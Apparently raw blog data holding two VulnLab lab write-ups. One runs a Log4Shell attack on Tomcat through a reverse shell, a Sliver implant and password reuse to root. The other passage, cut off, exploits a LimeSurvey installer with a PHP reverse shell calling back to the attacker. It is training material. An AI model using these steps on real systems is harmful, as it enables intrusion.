Resources\n\nhttps://www.ibm.com/topics/log4shell\nhttps://www.youtube.com/watch?v=nF8tfsY74ws\nhttps://www.dynatrace.com/news/blog/what-is-log4shell/\nhttps://github.com/kozmer/log4j-shell-poc\nhttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\nhttps://github.com/BishopFox/sliver\nhttps://discord.com/invite/vulnlab\n\n","slug":"feedback","published":1,"updated":"2024-06-05T20:04:38.119Z","_id":"clx1flim10000m8uf6jl1ckbg","comments":1,"layout":"post","photos":[],"content":"<p>This is another machine from VulnLab, and it involves exploiting a Log4J vulnerability in a web service and use it to access internal resources to compromise a Linux machine. This specific machine seems to focus heavily on web services, which is a nice change of pace to the AD pen-testing that I’m used to.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 22:30 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.75.95</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">8080/tcp open  http-proxy</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is a proxy on port <code>8080</code>, so we’ll try to access that through our web browser. Remember to append the port number after the URL so you can access the website properly.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/b.png\"></p>\n<p>We seem to be greeted with an Apache Tomcat website, to which we are within the root website of this server. there are three nodes towards the right (server status, manager app, and host manager), to which we do not have access to.</p>\n<p>The title of the website indicates to us that the version of this specific Apache Tomcat application is version <code>9.0.56</code>.</p>\n<p>Given that there isn’t much for us to look at due to this being the documentation portion of the website, let’s run a <code>gobuster</code> scan to see if there are any other webpages we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.75.95:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">/feedback             (Status: 302) [Size: 0] [--&gt; /feedback/]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there is an odd directory called <code>feedback</code>, which I’m assuming should be the apart of the attack path given the name of the machine. The other directory results are relatively common, so we’ll focus on this <code>feedback</code> directory that we’ve found.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/c.png\"></p>\n<p>As you’ll see this links us to a web panel that is asking for input feedback for the web service. You’ll notice that the page is relatively bare aside from the two input panels that we have access to.</p>\n<p>My first initial thought is to take a look at the request that gets sent from this feedback form through <a href=\"https://portswigger.net/burp/documentation/desktop/getting-started\">Burpsuite</a>.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/d.png\"></p>\n<p>The product of the request seems to be what I would’ve expected - you’ll see two parameters for our name and the feedback that we wanted to give to the website. That being said, you’ll notice an odd <code>JSESSIONID</code> parameter as our cookie parameter. I’m unfamiliar for this particular parameter, so we’ll research into it with regards to <code>Tomcat 9.0.56</code>.</p>\n<p>That brought me to an interesting vulnerability - Log4Shell.</p>\n<h1 id=\"Exploiting-Log4Shell\"><a href=\"#Exploiting-Log4Shell\" class=\"headerlink\" title=\"Exploiting Log4Shell\"></a>Exploiting Log4Shell</h1><p>Also known as the Log4J vulnerability, <a href=\"https://www.ibm.com/topics/log4shell\">Log4Shell</a> is a remote code execution vulnerability in a few of the versions of the Apache Log4J 2 Java library. This is an open-source logging library created by Apache that records information and events within a program. This is particularly directed towards error messages and user inputs.</p>\n<p>This isn’t it’s own service, but a snippet of code that Java applications can utilize at a broad scale. The issue at hand is a parameter that you can specify in most user input parsers that Log4J has to parse - specifically JNDI.</p>\n<p>JNDI, otherwise known as the Java Naming and Directory Interface, is an API that Java uses to access resources hosted on outside servers. A command exists called JNDI lookup that tells the application to go to the link provided in the input and execute it as code or a script. The older versions of Log4J will generally run any code provided to them without any form of handling. The goal of Log4Shell is to have the website using Log4J to execute a reverse shell and generate a session for the attacker.</p>\n<p>In our case, this application is vulnerable to Log4Shell within the input parameter on this webpage. You can find the POC for Log4Shell <a href=\"https://github.com/kozmer/log4j-shell-poc\">here</a>, which will require you to download JDK 1.8.0_20 and place it within the same directory as the exploit. You can find the specific JDK version within <a href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\">this</a> download page on Oracle.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/e.png\"></p>\n<p>As seen in the above, the POC will launch an LDAP and HTTP server for us to handle the exploit process. We’ll need to make sure a netcat session is listening on port <code>9001</code> using <code>nc -lvnp 9001</code>. The Java application that the HTTP server is using will redirect the machine we are attacking to our reverse shell once the exploit is executed by the machine.</p>\n<p>All that’s required next is to send the one-liner payload to an input field that Log4J will parse. In our case, you can put it in the <code>name</code> parameter. Make sure to URL encode the one-liner so the Log4J can parse it properly based on the request.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/f.png\"></p>\n<p>If we send the request in Repeater, we shouldn’t receive any output in the Response area of Repeater, indicating that something has caused the application to pause. If we return to our terminal window, we should see the exploit downloaded and a reverse shell appear on our listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9001    </span><br><span class=\"line\">listening on [any] 9001 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.75.95] 55526</span><br><span class=\"line\">whoami</span><br><span class=\"line\">tomcat</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we have access to a reverse shell, we’ll need to enumerate the machine to find if there is anything on the machine that we exploit for privilege escalation.</p>\n<p>Note that we do have a pretty bare-bones shell at the moment that does not have a TTY. You can use Python to spawn a valid TTY, though that’s up to you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">tomcat@ip-10-10-10-7:/$</span><br></pre></td></tr></table></figure>\n\n<p>I stood up a simple <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> C2 server and ran an implant on the machine so I could receive an easier way to transfer files to and from the machine.</p>\n<p>I did some research into this machine via the progress bar in the <a href=\"https://discord.gg/vulnlab\">Discord</a>, and it seems that this machine only has a root flag. You can verify this by accessing the <code>/home</code> directory of the machine, which seems to only have the default <code>ubuntu</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@ip-10-10-10-7:/$ ls -la /home</span><br><span class=\"line\">ls -la /home</span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxr-xr-x  3 root   root   4096 Dec 11  2021 .</span><br><span class=\"line\">drwxr-xr-x 23 root   root   4096 Jun  3 02:24 ..</span><br><span class=\"line\">drwxr-xr-x  5 ubuntu ubuntu 4096 Dec 11  2021 ubuntu</span><br></pre></td></tr></table></figure>\n\n<p>There was an interesting file that I found in <code>/opt/tomcat/conf/tomcat-users.xml</code>, which seems to include information about the <code>tomcat</code> users on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;user username=&quot;admin&quot; password=&quot;[...snip...]&quot; roles=&quot;manager-gui&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;robot&quot; password=&quot;[...snip...]&quot; roles=&quot;manager-script&quot;/&gt;</span><br></pre></td></tr></table></figure>\n\n<p>While these seem to be interesting credentials and would be helpful in a red-teaming environment, there isn’t really anything we can use these for as we can’t authenticate to the <code>Manager</code> panel in any fashion. That is what I had thought until I tried <code>su</code> to login as the root user on this machine. I used the same password that was within the above XML file, at it seemed to work properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@ip-10-10-10-7:~/conf$ su</span><br><span class=\"line\">Password: </span><br><span class=\"line\">root@ip-10-10-10-7:/opt/tomcat/conf# cd /root</span><br><span class=\"line\">root@ip-10-10-10-7:~# ls</span><br><span class=\"line\">root.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>Since we have access to the root flag, we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Although this was a relatively short machine, it’s sometimes common to see vulnerabilities in credential reusage such as what we did for this machine. It can even be as simple as reusing a password for any user. Nonetheless I did enjoy exploiting every part of this machine, and I believe that it is extremely user-friendly. Big thanks go out to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.ibm.com/topics/log4shell\">https://www.ibm.com/topics/log4shell</a><br><a href=\"https://www.youtube.com/watch?v=nF8tfsY74ws\">https://www.youtube.com/watch?v=nF8tfsY74ws</a><br><a href=\"https://www.dynatrace.com/news/blog/what-is-log4shell/\">https://www.dynatrace.com/news/blog/what-is-log4shell/</a><br><a href=\"https://github.com/kozmer/log4j-shell-poc\">https://github.com/kozmer/log4j-shell-poc</a><br><a href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://discord.com/invite/vulnlab\">https://discord.com/invite/vulnlab</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This is another machine from VulnLab, and it involves exploiting a Log4J vulnerability in a web service and use it to access internal resources to compromise a Linux machine. This specific machine seems to focus heavily on web services, which is a nice change of pace to the AD pen-testing that I’m used to.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 22:30 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.75.95</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">8080/tcp open  http-proxy</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is a proxy on port <code>8080</code>, so we’ll try to access that through our web browser. Remember to append the port number after the URL so you can access the website properly.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/b.png\"></p>\n<p>We seem to be greeted with an Apache Tomcat website, to which we are within the root website of this server. there are three nodes towards the right (server status, manager app, and host manager), to which we do not have access to.</p>\n<p>The title of the website indicates to us that the version of this specific Apache Tomcat application is version <code>9.0.56</code>.</p>\n<p>Given that there isn’t much for us to look at due to this being the documentation portion of the website, let’s run a <code>gobuster</code> scan to see if there are any other webpages we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.75.95:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">/feedback             (Status: 302) [Size: 0] [--&gt; /feedback/]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there is an odd directory called <code>feedback</code>, which I’m assuming should be the apart of the attack path given the name of the machine. The other directory results are relatively common, so we’ll focus on this <code>feedback</code> directory that we’ve found.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/c.png\"></p>\n<p>As you’ll see this links us to a web panel that is asking for input feedback for the web service. You’ll notice that the page is relatively bare aside from the two input panels that we have access to.</p>\n<p>My first initial thought is to take a look at the request that gets sent from this feedback form through <a href=\"https://portswigger.net/burp/documentation/desktop/getting-started\">Burpsuite</a>.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/d.png\"></p>\n<p>The product of the request seems to be what I would’ve expected - you’ll see two parameters for our name and the feedback that we wanted to give to the website. That being said, you’ll notice an odd <code>JSESSIONID</code> parameter as our cookie parameter. I’m unfamiliar for this particular parameter, so we’ll research into it with regards to <code>Tomcat 9.0.56</code>.</p>\n<p>That brought me to an interesting vulnerability - Log4Shell.</p>\n<h1 id=\"Exploiting-Log4Shell\"><a href=\"#Exploiting-Log4Shell\" class=\"headerlink\" title=\"Exploiting Log4Shell\"></a>Exploiting Log4Shell</h1><p>Also known as the Log4J vulnerability, <a href=\"https://www.ibm.com/topics/log4shell\">Log4Shell</a> is a remote code execution vulnerability in a few of the versions of the Apache Log4J 2 Java library. This is an open-source logging library created by Apache that records information and events within a program. This is particularly directed towards error messages and user inputs.</p>\n<p>This isn’t it’s own service, but a snippet of code that Java applications can utilize at a broad scale. The issue at hand is a parameter that you can specify in most user input parsers that Log4J has to parse - specifically JNDI.</p>\n<p>JNDI, otherwise known as the Java Naming and Directory Interface, is an API that Java uses to access resources hosted on outside servers. A command exists called JNDI lookup that tells the application to go to the link provided in the input and execute it as code or a script. The older versions of Log4J will generally run any code provided to them without any form of handling. The goal of Log4Shell is to have the website using Log4J to execute a reverse shell and generate a session for the attacker.</p>\n<p>In our case, this application is vulnerable to Log4Shell within the input parameter on this webpage. You can find the POC for Log4Shell <a href=\"https://github.com/kozmer/log4j-shell-poc\">here</a>, which will require you to download JDK 1.8.0_20 and place it within the same directory as the exploit. You can find the specific JDK version within <a href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\">this</a> download page on Oracle.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/e.png\"></p>\n<p>As seen in the above, the POC will launch an LDAP and HTTP server for us to handle the exploit process. We’ll need to make sure a netcat session is listening on port <code>9001</code> using <code>nc -lvnp 9001</code>. The Java application that the HTTP server is using will redirect the machine we are attacking to our reverse shell once the exploit is executed by the machine.</p>\n<p>All that’s required next is to send the one-liner payload to an input field that Log4J will parse. In our case, you can put it in the <code>name</code> parameter. Make sure to URL encode the one-liner so the Log4J can parse it properly based on the request.</p>\n<p><img src=\"/images/vulnlab/feedback-vl/f.png\"></p>\n<p>If we send the request in Repeater, we shouldn’t receive any output in the Response area of Repeater, indicating that something has caused the application to pause. If we return to our terminal window, we should see the exploit downloaded and a reverse shell appear on our listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9001    </span><br><span class=\"line\">listening on [any] 9001 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.75.95] 55526</span><br><span class=\"line\">whoami</span><br><span class=\"line\">tomcat</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we have access to a reverse shell, we’ll need to enumerate the machine to find if there is anything on the machine that we exploit for privilege escalation.</p>\n<p>Note that we do have a pretty bare-bones shell at the moment that does not have a TTY. You can use Python to spawn a valid TTY, though that’s up to you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">tomcat@ip-10-10-10-7:/$</span><br></pre></td></tr></table></figure>\n\n<p>I stood up a simple <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> C2 server and ran an implant on the machine so I could receive an easier way to transfer files to and from the machine.</p>\n<p>I did some research into this machine via the progress bar in the <a href=\"https://discord.gg/vulnlab\">Discord</a>, and it seems that this machine only has a root flag. You can verify this by accessing the <code>/home</code> directory of the machine, which seems to only have the default <code>ubuntu</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@ip-10-10-10-7:/$ ls -la /home</span><br><span class=\"line\">ls -la /home</span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxr-xr-x  3 root   root   4096 Dec 11  2021 .</span><br><span class=\"line\">drwxr-xr-x 23 root   root   4096 Jun  3 02:24 ..</span><br><span class=\"line\">drwxr-xr-x  5 ubuntu ubuntu 4096 Dec 11  2021 ubuntu</span><br></pre></td></tr></table></figure>\n\n<p>There was an interesting file that I found in <code>/opt/tomcat/conf/tomcat-users.xml</code>, which seems to include information about the <code>tomcat</code> users on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;user username=&quot;admin&quot; password=&quot;[...snip...]&quot; roles=&quot;manager-gui&quot;/&gt;</span><br><span class=\"line\">&lt;user username=&quot;robot&quot; password=&quot;[...snip...]&quot; roles=&quot;manager-script&quot;/&gt;</span><br></pre></td></tr></table></figure>\n\n<p>While these seem to be interesting credentials and would be helpful in a red-teaming environment, there isn’t really anything we can use these for as we can’t authenticate to the <code>Manager</code> panel in any fashion. That is what I had thought until I tried <code>su</code> to login as the root user on this machine. I used the same password that was within the above XML file, at it seemed to work properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@ip-10-10-10-7:~/conf$ su</span><br><span class=\"line\">Password: </span><br><span class=\"line\">root@ip-10-10-10-7:/opt/tomcat/conf# cd /root</span><br><span class=\"line\">root@ip-10-10-10-7:~# ls</span><br><span class=\"line\">root.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>Since we have access to the root flag, we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Although this was a relatively short machine, it’s sometimes common to see vulnerabilities in credential reusage such as what we did for this machine. It can even be as simple as reusing a password for any user. Nonetheless I did enjoy exploiting every part of this machine, and I believe that it is extremely user-friendly. Big thanks go out to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.ibm.com/topics/log4shell\">https://www.ibm.com/topics/log4shell</a><br><a href=\"https://www.youtube.com/watch?v=nF8tfsY74ws\">https://www.youtube.com/watch?v=nF8tfsY74ws</a><br><a href=\"https://www.dynatrace.com/news/blog/what-is-log4shell/\">https://www.dynatrace.com/news/blog/what-is-log4shell/</a><br><a href=\"https://github.com/kozmer/log4j-shell-poc\">https://github.com/kozmer/log4j-shell-poc</a><br><a href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://discord.com/invite/vulnlab\">https://discord.com/invite/vulnlab</a></p>\n"},{"title":"Forgotten - Vulnlab","date":"2024-06-05T06:12:54.000Z","keywords":"Vulnlab, Easy, Linux","description":"This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.","cover":"/images/vulnlab/forgotten-vl/forgotten_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.\n\n# Enumeration\n\nLet's start with our usual NMAP scan to see what ports are open.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 21:55 EDT\nNmap scan report for 10.10.113.195\nHost is up (0.11s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 25:94:a4:a0:85:b6:06:ae:b3:7b:5e:45:c1:b6:32:b5 (ECDSA)\n|_  256 22:d1:a0:9e:e2:58:92:d3:7b:9d:86:0f:04:28:8c:65 (ED25519)\n80/tcp open  http    Apache httpd 2.4.56\n|_http-server-header: Apache/2.4.56 (Debian)\n|_http-title: 403 Forbidden\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   99.64 ms  10.8.0.1\n2   102.00 ms 10.10.113.195\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.32 seconds\n```\n\nI see a lot of these on HTB, so I'm relatively used to seeing just port 22 (SSH) and port 80 (HTTP) open. Nonetheless let's see specifically what's running on the web server.\n\n![](/images/vulnlab/forgotten-vl/b.jpg)\n\nThis is interesting, as immediately the moment we try to access the base link for the website, it says we do not have access to the resource. At this point, I'm assuming that we are guaranteed to find subdirectories from a `gobuster` scan, since we have no other resources to access at this point.\n`gobuster dir -u http://10.10.113.195/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`\n\nUpon a brief few seconds of scanning, we are greeted with a 301 redirect to `/survey`.\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/survey               (Status: 301) [Size: 315] [--> http://10.10.113.195/survey/]\n/server-status        (Status: 403) [Size: 278]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\nUpon accessing the redirect, we are brought to an installation page for `LimeSurvey`.\n\n# Exploiting Limesurvey Installation\n\nBased off some research, it seems as though LimeSurvey is an open-source survey application that is used to develop online surveys and quizzes for its audience. It's primarily built up in PHP and utilizes SQL database applications such as MySQL, PostgreSQL, or even the Windows alternative of MSSQL.\n\nThis specific product seems to be marketed towards researchers, universities, web developers and students alike.\n\n![](/images/vulnlab/forgotten-vl/b_1.jpg)\n\nI researched into a few CVEs for LimeSurvey 6.3.7, however there wasn't much that I could find regarding our specific instance of it. Most of the CVEs related to versions 5.0, 3.0, and a few versions in between.\n\nNonetheless, we can progress with the installation, so we'll continue to do that until something particularly interesting comes up.\n\nI've listed my thoughts on each section of the installation page below in the form of a list and what I think we could potentially accomplish.\n\n1. Welcome -> Contains Language selection and `installation start` option.\n2. License -> Regulatory information, nothing out of the ordinary.\n3. Pre-installation Check -> Contains vital information regarding the services used for this LimeSurvey instance.\n\nI'd like to point out something interesting - it seems as though a MySQL database option is present within the pre-installation check. That being said, we could not see one on the frontend of the server (based off our NMAP scan), nor is the option checked off within this screen.\n\nThe other information on this page does not seem to be as important, as the PHP version does not seem to be exploitable to my awareness.\n\n4. Configuration -> Main attack path concern, allows us to configure various parts of the application - namely the database.\n\nAs explained previously, this section of the installation page seemed odd at first glance as it allows us to configure the MySQL database association with our LimeSurvey instance.\n\n5. Database settings -> Unconfigurable until database configuration is completed.\n6. Administrator settings -> Unconfigurable until database configuration is completed.\n\nAs I explained previously, the database configuration portion of the installation seems the most interesting. The particular section within this page that I'm referring to is the `Database location` section, which is seemingly allowing us to allocate an IP address of a database to the LimeSurvey instance.\n\n![](/images/vulnlab/forgotten-vl/c.jpg)\n\nWhile this is preset to `localhost`, I don't see any reason as to why we couldn't alter this to potentially point somewhere else - such as to our own machine.\n\n# Local MySQL Configuration\n\nSo with that in mind, let's try to set up our own MySQL database server within our attack machine. https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\n\n```\ndaz@daz$ sudo apt install mariadb-server\n\ndaz@daz$ sudo systemctl start mysql\n\ndaz@daz$ sudo service mysql status\n● mariadb.service - MariaDB 10.11.6 database server\n     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)\n     Active: active (running) since Tue 2024-05-14 22:52:07 EDT; 1min 36s ago\n     [...snip...]\n\ndaz@daz$ sudo mysql\n```\n\nSo we'll need to specify a user to authenticate as for our particular case, which I used this [article](https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B) on StrongDM to help with.\n\nI'll outline the steps we need to take in order to create a database and set up the necessary privileges to a user for our LimeSurvey installation.\n\nFirst we'll need to create a database to use, since LimeSurvey requires a `Database name` to be supplied with the installation.\n\n```\nMariaDB [(none)]> CREATE DATABASE limesurvey;\nQuery OK, 1 row affected (0.001 sec)\n```\n\nNext, we'll create a user under the alias `lime_user` who will have all of the necessary privileges to our setup.\n\n```\nMariaDB [(none)]> CREATE USER 'lime_user'@'%' IDENTIFIED by 'lime_user' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.006 sec)\n```\n\nNote that the `%` in our user creation query essentially acts as a wildcard for all interfaces.\n\nThe next concern we need to focus on is the specific privileges that our user has in relation to what we need for the setup. To any beginners, a MySQL privilege is essentially any ruleset or specified rule that a MySQL user has that regulates their actions on a database. This essentially restricts the user into performing various actions on the database based on the privileges they are given. This can be broken up into 4 different types of privileges:\n\n**Global Privileges**: These privileges apply to every database on the hosted server. By default, administrative privileges will fall into this category as they enable a user to perform operations that are relative to a specific database.\n**Database Privileges**: As expected in the name, these privileges apply solely to specified databases and all objects within those databases (i.e. columns, tables, entries, etc.).\n**Proxy Privileges**: These allow a user to act in the context of other users and adopt their same privileges within the space of the situation they are involved in.\n**Object Privileges**: These privileges apply solely to the types of objects stored in a database and can be granted between a set of objects if needed.\n\nIn a red-teaming environment such as an enterprise infrastructure, we'd want to create a user that looks relatively normal and in-line with regular options as not to arise suspicious. We can do this by delegating specific privileges to them such as `INSERT` or `ALTER` dependent on what is needed for the setup.\n\nHowever this won't be the case for our situation, so we can grant them `ALL PRIVILEGES` so they can perform any actions needed.\n\n```\nMariaDB [(none)]> GRANT ALL ON *.* TO 'lime_user'@'%' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.006 sec)\n```\n\nNote that we're essentially saying that our username/password is `lime_user:lime_user` with the above query.*\n\nWe can confirm that our privileges have been granted to the specific user with the below query.\n\n```\nMariaDB [(none)]> SHOW GRANTS for 'lime_user'@'%';\n+-------------------------------------------------------------------------------------------------------------------------------------+\n| Grants for lime_user@%                                                                                                              |\n+-------------------------------------------------------------------------------------------------------------------------------------+\n| GRANT ALL PRIVILEGES ON *.* TO `lime_user`@`%` IDENTIFIED BY PASSWORD '*0F1EF1AB79F549AD4FE495927D8C200E7413BD85' WITH GRANT OPTION |\n+-------------------------------------------------------------------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n\nAnother thing we'll also need to do is configure the bind address for our MySQL server. By default, it's meant to listen solely on localhost as it acts as a backend server.\n\nWe can do this by editing `/etc/mysql/mariadb.conf.d/50-server.cnf` and changing the `bind-address` to `0.0.0.0` to listen on all interfaces.\n\nThis should allow the remote configuration to access our MySQL server and populate any fields needed. We can then restart our MySQL server with `sudo systemctl restart mysql`\n\nWe'll also need flush all of our privileges to ensure that they are configured correctly.\n\n```\nMariaDB [(none)]> FLUSH PRIVILEGES;\nQuery OK, 0 rows affected (0.001 sec)\n```\n\n# Redirecting Database Configuration to Local MySQL\n\nWith that, our backend database configuration should be finished and ready for the LimeSurvey setup. We'll fill in the necessary parameters into the configuration page and hope for any progress.\n\n![](/images/vulnlab/forgotten-vl/d.jpg)\n\nIf we have followed all the previous steps and select the `Next` button, we can see that we're greeted with a message that is asking us to populate the `limesurvey` database. It also tells us that the database already exists, since we've already created it the previous setup steps. We'll select `Populate database`.\n\nAfterwards, we're brought to an administration configuration, to which we can configure our admin credentials to just be `daz:daz` and just populate the rest with fake information.\n\n![](/images/vulnlab/forgotten-vl/e.jpg)\n\nIt then notifies us that our password has been confirmed and that it will allow us to authenticate to the administration panel. We'll select `Administration` to access this panel.*\n\nWe're brought to a login page, to which we can use the same credentials that we provided within the configuration portion of the setup.\n\n![](/images/vulnlab/forgotten-vl/f.jpg)\n\n# Limesurvey RCE\n\nWe're greeted with the LimeSurvey administration panel, which seems to have a lot of stuff from us to mess with. Upon first glance, I was immediately drawn into the `Plugin` and `Theme` functionalities within the `Configuration` tab, so we'll see if we can potentially upload anything for RCE.\n\nGenerally with web-applications like these, if we're allowed to upload a plugin, we can upload a malicious reverse shell and have it callback to our machine.\n\nThe resource we'll use to generate our reverse shell can be found [here](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).\n\nThe steps can be outlined below for how I used it, though you can also reference the README file within the repository on how to use it.\n\nFirstly, let's clone the repository with `git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git`. This will clone the repository to our machine, to which we can use the files within it.\n\nAccording to the README, all that is required of us is to compress the `php-rev.php` and `config.xml` to a zip file and upload it as a plugin. There are a few prerequisites that we'll need to take into account in terms of file changes before sending the plugin into the server.\n\nFirst, let's change the `php-rev.php` IP address and port to point to a netcat reverse shell that we'll stand up on our attack machine in a few moments.\n\n`$ip = '10.8.0.173';`\n`$port = 9001;`\n\nNext, we'll need to change the `config.xml` to make it usable on our current LimeSurvey version. If we do not change 